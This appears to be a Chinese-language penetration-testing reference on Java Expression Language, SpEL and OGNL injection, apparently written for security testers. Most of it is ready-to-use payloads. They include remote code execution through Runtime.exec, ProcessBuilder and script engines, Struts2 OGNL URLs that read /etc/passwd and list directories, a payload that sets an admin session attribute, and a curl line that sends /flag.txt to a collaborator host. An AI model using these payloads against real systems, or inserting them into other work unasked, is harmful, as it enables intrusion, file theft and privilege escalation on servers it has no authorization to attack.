---
attack_surface: [注入类, 编码/序列化滥用]
impact: [远程代码执行, 信息泄露, 权限提升]
risk_level: 严重
prerequisites:
  - Java/JavaEE 基础
  - EL/OGNL/SpEL 基本语法
related_techniques:
  - ssti-server-side-template-injection
  - deserialization
  - command-injection
difficulty: 高级
tools:
  - Burp Suite
---

# EL (Expression Language) / SpEL / OGNL 专项深度分析

> 关联文档：[SSTI 主文档](./README.md) · [Jinja2 Deep Dive](./Jinja2%20Deep%20Dive.md)

---

# 0x01 背景与原理

Expression Language (EL) 是 JavaEE 中连接表现层 (web pages) 与应用逻辑层 (managed beans) 的核心机制。它天然支持方法调用，是 SSTI 攻击面中的最高危子类之一。

EL 深度集成于以下 JavaEE 技术栈：

- **JavaServer Faces (JSF)**：绑定 UI 组件到后端数据/行为
- **JavaServer Pages (JSP)**：在 JSP 页面中访问和操作数据
- **Contexts and Dependency Injection (CDI)**：桥接 web 层与 managed beans
- **Spring Framework**：广泛用于 Security、Data、MVC 等模块
- **Apache Struts2**：OGNL 表达式注入的历史重灾区

**版本差异**：EL 的不同版本对特性支持和字符限制存在显著差异。某些版本默认禁用方法调用，需要特定配置才能开启。

---

# 0x02 SpEL 本地测试环境

通过 Maven 拉取依赖，搭建本地 Spring Expression Language 注入测试环境：

## 2.1 依赖 Jar

从 [Maven Repository](https://mvnrepository.com) 下载：
- `commons-lang3-3.9.jar`
- `spring-core-5.2.1.RELEASE.jar`
- `commons-logging-1.2.jar`
- `spring-expression-5.2.1.RELEASE.jar`

## 2.2 测试代码

```java
import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;

public class Main {
    public static ExpressionParser PARSER;

    public static void main(String[] args) throws Exception {
        PARSER = new SpelExpressionParser();

        System.out.println("Enter a String to evaluate:");
        java.io.BufferedReader stdin = new java.io.BufferedReader(new java.io.InputStreamReader(System.in));
        String input = stdin.readLine();
        Expression exp = PARSER.parseExpression(input);
        String result = exp.getValue().toString();
        System.out.println(result);
    }
}
```

## 2.3 编译与运行

```bash
# 安装 JDK (如尚未安装)
sudo apt install default-jdk

# 编译
javac -cp commons-lang3-3.9.jar:spring-core-5.2.1.RELEASE.jar:spring-expression-5.2.1.RELEASE.jar:commons-lang3-3.9.jar:commons-logging-1.2.jar:. Main.java

# 运行
java -cp commons-lang3-3.9.jar:spring-core-5.2.1.RELEASE.jar:spring-expression-5.2.1.RELEASE.jar:commons-lang3-3.9.jar:commons-logging-1.2.jar:. Main
Enter a String to evaluate:
{5*5}
[25]
```

注意：`{5*5}` 被直接求值，证明 SpEL 解析器对表达式执行无限制。

---

# 0x03 基础操作 Payload

```java
// 字符串操作
{"a".toString()}                              → [a]
{"dfd".replace("d","x")}                      → [xfx]

// 获取类对象
{"".getClass()}                               → [class java.lang.String]
{""["class"]}                                 // 绕过 getClass

// 获取任意类
{"".getClass().forName("java.util.Date")}     → [class java.util.Date]

// 枚举方法
{"".getClass().forName("java.util.Date").getMethods()[0].toString()}  → public boolean java.util.Date.equals(...)
```

---

# 0x04 检测与指纹

## 4.1 Burp Suite 检测向量

```java
// 字符串替换确认 EL 执行
gk6q${"zkz".toString().replace("k", "x")}doap2
// 如果返回 igk6qzxzdoap2，证明 EL 解析器正在运行
```

## 4.2 J2EE 检测向量

```
# J2EEScan — 用 INJPARAM 内容替换响应体
https://example.com/?p=${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23kzxs%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23kzxs.print(%23parameters.INJPARAM[0])%2c%23kzxs.print(new%20java.lang.Integer(829%2b9))%2c%23kzxs.close(),1%3f%23xx%3a%23request.toString}&INJPARAM=HOOK_VAL
```

## 4.3 盲检测 — Sleep 10 秒

```
https://example.com/?p=${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23kzxs%3d%40java.lang.Thread%40sleep(10000)%2c1%3f%23xx%3a%23request.toString}
```

---

# 0x05 RCE 方法全集

## 5.1 基础 Runtime.exec()

```java
// Step 1: 确认 getRuntime 方法存在
{"".getClass().forName("java.lang.Runtime").getMethods()[6].toString()}
// → public static java.lang.Runtime java.lang.Runtime.getRuntime()

// Step 2: 执行命令（无回显）
{"".getClass().forName("java.lang.Runtime").getRuntime().exec("curl http://127.0.0.1:8000")}

// 绕过 getClass
#{""["class"].forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("curl <instance>.burpcollaborator.net")}

// HTML 实体内注入
<a th:href="${''.getClass().forName('java.lang.Runtime').getRuntime().exec('curl -d @/flag.txt burpcollab.com')}" th:title='pepito'>
```

## 5.2 ProcessBuilder

```java
// 多参数命令执行
${request.setAttribute("c","".getClass().forName("java.util.ArrayList").newInstance())}
${request.getAttribute("c").add("cmd.exe")}
${request.getAttribute("c").add("/k")}
${request.getAttribute("c").add("ping x.x.x.x")}
${request.setAttribute("a","".getClass().forName("java.lang.ProcessBuilder").getDeclaredConstructors()[0].newInstance(request.getAttribute("c")).start())}
${request.getAttribute("a")}
```

## 5.3 Runtime 反射 + Invoke

```java
${"".getClass().forName("java.lang.Runtime").getMethods()[6].invoke("".getClass().forName("java.lang.Runtime")).exec("calc.exe")}
```

## 5.4 Runtime 通过 getDeclaredConstructors

```java
#{session.setAttribute("rtc","".getClass().forName("java.lang.Runtime").getDeclaredConstructors()[0])}
#{session.getAttribute("rtc").setAccessible(true)}
#{session.getAttribute("rtc").getRuntime().exec("/bin/bash -c whoami")}
```

## 5.5 ScriptEngineManager 一行

```java
${request.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\\\"ping x.x.x.x\\\")")}
```

## 5.6 ScriptEngineManager 多命令变体（Jinjava/HuBL 兼容）

```java
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
```

## 5.7 SpEL 字符码绕过

```java
// 不直接写 "cmd /c dir" — 用 charCode 动态构造
T(java.lang.Runtime).getRuntime().exec('cmd /c dir')
T(java.lang.System).getenv()[0]
T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec("cmd /c dir").getInputStream())
''.class.forName('java.lang.Runtime').getRuntime().exec('calc.exe')

// Spring StreamUtils 复制输出到响应
(T(org.springframework.util.StreamUtils).copy(T(java.lang.Runtime).getRuntime().exec("cmd "+T(java.lang.String).valueOf(T(java.lang.Character).toChars(0x2F))+"c "+T(java.lang.String).valueOf(new char[]{T(java.lang.Character).toChars(100)[0],T(java.lang.Character).toChars(105)[0],T(java.lang.Character).toChars(114)[0]})).getInputStream(),T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream()))
```

## 5.8 OGNL RCE (Struts2 / Linux)

```
https://example.com/?p=${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23wwww=@java.lang.Runtime@getRuntime(),%23ssss=new%20java.lang.String[3],%23ssss[0]="%2fbin%2fsh",%23ssss[1]="%2dc",%23ssss[2]=%23parameters.INJPARAM[0],%23wwww.exec(%23ssss),%23kzxs%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23kzxs.print(%23parameters.INJPARAM[0])%2c%23kzxs.close(),1%3f%23xx%3a%23request.toString}&INJPARAM=touch%20/tmp/InjectedFile.txt
```

## 5.9 OGNL RCE (Windows)

```
https://example.com/?p=${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23wwww=@java.lang.Runtime@getRuntime(),%23ssss=new%20java.lang.String[3],%23ssss[0]="cmd",%23ssss[1]="%2fC",%23ssss[2]=%23parameters.INJPARAM[0],%23wwww.exec(%23ssss),%23kzxs%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23kzxs.print(%23parameters.INJPARAM[0])%2c%23kzxs.close(),1%3f%23xx%3a%23request.toString}&INJPARAM=touch%20/tmp/InjectedFile.txt
```

---

# 0x06 远程文件包含

```
https://example.com/?p=${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23wwww=new%20java.io.File(%23parameters.INJPARAM[0]),%23pppp=new%20java.io.FileInputStream(%23wwww),%23qqqq=new%20java.lang.Long(%23wwww.length()),%23tttt=new%20byte[%23qqqq.intValue()],%23llll=%23pppp.read(%23tttt),%23pppp.close(),%23kzxs%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23kzxs.print(new+java.lang.String(%23tttt))%2c%23kzxs.close(),1%3f%23xx%3a%23request.toString}&INJPARAM=%2fetc%2fpasswd
```

---

# 0x07 目录列表

```
https://example.com/?p=${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23wwww=new%20java.io.File(%23parameters.INJPARAM[0]),%23pppp=%23wwww.listFiles(),%23qqqq=@java.util.Arrays@toString(%23pppp),%23kzxs%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23kzxs.print(%23qqqq)%2c%23kzxs.close(),1%3f%23xx%3a%23request.toString}&INJPARAM=..
```

---

# 0x08 环境侦察

## 8.1 内置变量

```java
${sessionScope.toString()}     // 会话变量
${applicationScope}            // 全局应用变量
${requestScope}                // 请求变量
${initParam}                   // 应用初始化变量
${param.X}                     // HTTP 参数值 (X = 参数名)
${pageContext}                 // JSP 页面上下文
```

## 8.2 自定义业务变量（常见命名）

```java
${user}
${password}
${employee.FirstName}
${facesContext}
${request}
${session}
```

## 8.3 授权绕过示例

```java
// 直接在 EL 中设置 admin 会话属性
${pageContext.request.getSession().setAttribute("admin", true)}
```

---

# 0x09 WAF 绕过参考

- [Spring EL WAF Bypass 实战 (h1pmnh)](https://h1pmnh.github.io/post/writeup_spring_el_waf_bypass/)
- [Hacking SpEL Part 1 (xvnpw)](https://xvnpw.medium.com/hacking-spel-part-1-d2ff2825f62a)
- [SpEL Injection Payloads 全集 (marcin33)](https://github.com/marcin33/hacking/blob/master/payloads/spel-injections.txt)

---

# 0x0A 参考资料

- [Exploiting OGNL Injection in Apache Struts (MediaService)](https://techblog.mediaservice.net/2016/10/exploiting-ognl-injection/)
- [Remote Code Execution with EL Injection Vulnerabilities (Exploit-DB PDF)](https://www.exploit-db.com/docs/english/46303-remote-code-execution-with-el-injection-vulnerabilities.pdf)
- [PayloadsAllTheThings — SSTI Tools](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#tools)
- [PortSwigger Research — Server-Side Template Injection](https://portswigger.net/research/server-side-template-injection)
